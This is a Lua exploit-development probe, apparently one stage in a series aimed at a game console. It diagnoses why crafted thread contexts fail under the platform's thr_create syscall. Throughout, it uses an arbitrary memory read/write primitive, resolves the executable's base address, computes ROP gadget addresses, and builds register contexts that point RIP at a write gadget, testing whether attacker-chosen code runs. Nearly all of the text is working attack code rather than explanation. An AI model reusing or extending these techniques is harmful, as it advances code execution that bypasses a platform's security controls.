-- CRASH_CLASS: MODERATE
-- PROBE 80d: Thread creation diagnostics
--
-- Context: 80a-80c show thr_create returns rv=-1 but allocates a TID.
-- The thread never writes to memory. Either:
--   1. rv=-1 means the context was rejected (thread never starts)
--   2. The thread starts but faults before executing our first instruction
--   3. mc_flags or other context fields need specific values
--
-- This probe tests systematically:
--   A: What does 76d's working context (Thrd_exit entry) look like exactly?
--      Reproduce 76d's approach but check rv carefully.
--   B: Test mc_flags values (the 58e probes set +0x110=0x10000)
--   C: Test with all context fields from 58e that returned rv=0
--   D: Use the 58e context layout but with our gadget as RIP

print("=== PROBE 80d: THREAD CREATION DIAGNOSTICS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. tostring(syscall.sc_getpid():tonumber()))

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[*] eboot=" .. q(eboot))

local mov_rdi_eax = eboot + 0x92C68
local ret_gadget = eboot + 0x42
print("[*] mov_rdi_eax=" .. q(mov_rdi_eax))
print("[*] ret=" .. q(ret_gadget))

-- Verify
local b0, b1, b2 = rb(mov_rdi_eax), rb(mov_rdi_eax+1), rb(mov_rdi_eax+2)
print("[*] gadget bytes: " .. string.format("%02X %02X %02X", b0 or 0, b1 or 0, b2 or 0))

local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)

-- GPU mmap for stack
local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("[*] stack=" .. q(stack_base))
local stack_top = stack_base + (14 * 0x4000)
zero(stack_top, 0x200)

-- ============================================================
-- A: Reproduce 58e section D layout exactly (rv=0 proven)
--    58e wrote: ctx+0x108=0x480, ctx+0x0D0=0, ctx+0x110=0x10000
--    These are NOT mcontext-relative — they are ctx-relative!
-- ============================================================
print("")
print("=== A: 58e layout (ctx-relative offsets, NO CS/SS) ===")

local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
-- 58e's proven fields
wq(ctx + 0x108, uint64(0x480))     -- mc_len at ctx+0x108
wd(ctx + 0x0D0, 0)                  -- some flag at ctx+0x0D0
wq(ctx + 0x110, uint64(0x10000))   -- mc_flags at ctx+0x110

-- RIP at ctx+0x90 (58e's layout) — set to ret gadget
wq(ctx + 0x90, ret_gadget)
-- RSP at ctx+0xA8
wq(ctx + 0xA8, stack_top)

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

local ok1, rv1 = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(rv1) .. " ok=" .. tostring(ok1))
print("  tid=" .. q(rq(tid_buf)))
print("  rv_num=" .. tostring(to_num(rv1)))

-- ============================================================
-- B: 58e layout + CS=0x43/SS=0x3B at ctx-relative offsets
--    ctx+0x98 = CS, ctx+0xB0 = SS (from 80a's offset mapping)
-- ============================================================
print("")
print("=== B: 58e layout + CS=0x43/SS=0x3B ===")

zero(ctx, 0x600)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x90, ret_gadget)           -- RIP
wq(ctx + 0xA8, stack_top)            -- RSP
wq(ctx + 0x98, uint64(0x43))         -- CS
wq(ctx + 0xB0, uint64(0x3B))         -- SS
wq(ctx + 0xA0, uint64(0x202))        -- RFLAGS

zero(tid_buf, 8)
local ok2, rv2 = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(rv2) .. " ok=" .. tostring(ok2))
print("  tid=" .. q(rq(tid_buf)))

-- ============================================================
-- C: 58e layout + CS + write gadget as RIP + register priming
-- ============================================================
print("")
print("=== C: 58e layout + CS + write gadget RIP ===")

zero(ctx, 0x600)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x90, mov_rdi_eax)          -- RIP = mov [rdi], eax; ret
wq(ctx + 0xA8, stack_top)            -- RSP
wq(ctx + 0x98, uint64(0x43))         -- CS
wq(ctx + 0xB0, uint64(0x3B))         -- SS
wq(ctx + 0xA0, uint64(0x202))        -- RFLAGS
-- RDI at ctx+0x58 (mcontext+0x48, ctx = mcontext-0x10... wait)
-- Let me figure out register offsets in ctx-relative terms.
-- From 80a: MC_OFFSET=0x10, MC_RDI=MC_OFFSET+0x48=0x58
-- So RDI is at ctx+0x58, RAX at ctx+0x80
wq(ctx + 0x58, marker)               -- RDI = marker addr
wq(ctx + 0x80, uint64(0xDEADBEEF))   -- RAX = value

wd(marker, 0x41414141)  -- reset marker
print("  marker before: 0x" .. string.format("%08X", rd(marker) or 0))

zero(tid_buf, 8)
local ok3, rv3 = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(rv3) .. " ok=" .. tostring(ok3))
print("  tid=" .. q(rq(tid_buf)))

-- Wait
local dummy = 0
for i = 1, 3000000 do dummy = dummy + 1 end

print("  marker after: 0x" .. string.format("%08X", rd(marker) or 0))
if rd(marker) == 0xDEADBEEF then
    print("  *** MARKER WRITTEN! THREAD EXECUTED! ***")
end

-- ============================================================
-- D: NO CS/SS (58e original) + write gadget — does rv=0 mean exec?
-- ============================================================
print("")
print("=== D: 58e layout NO CS/SS + write gadget RIP ===")

zero(ctx, 0x600)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x90, mov_rdi_eax)          -- RIP = mov [rdi], eax; ret
wq(ctx + 0xA8, stack_top)            -- RSP
-- NO CS/SS/RFLAGS — matches 58e which got rv=0
wq(ctx + 0x58, marker)               -- RDI = marker
wq(ctx + 0x80, uint64(0xCAFEBABE))   -- RAX = different value

wd(marker, 0x41414141)
print("  marker before: 0x" .. string.format("%08X", rd(marker) or 0))

zero(tid_buf, 8)
local ok4, rv4 = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(rv4) .. " ok=" .. tostring(ok4))
print("  tid=" .. q(rq(tid_buf)))

for i = 1, 3000000 do dummy = dummy + 1 end

print("  marker after: 0x" .. string.format("%08X", rd(marker) or 0))
if rd(marker) == 0xCAFEBABE then
    print("  *** MARKER WRITTEN! rv=0 THREADS EXECUTE! ***")
elseif rd(marker) == 0xDEADBEEF then
    print("  marker shows DEADBEEF — carryover from section C!")
end

-- ============================================================
-- E: Check rv interpretation
-- ============================================================
print("")
print("=== E: rv analysis ===")
print("  A rv=" .. tostring(rv1))
print("  B rv=" .. tostring(rv2))
print("  C rv=" .. tostring(rv3))
print("  D rv=" .. tostring(rv4))

local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] canary: " .. tostring(alive))
print("=== PROBE 80d COMPLETE ===")
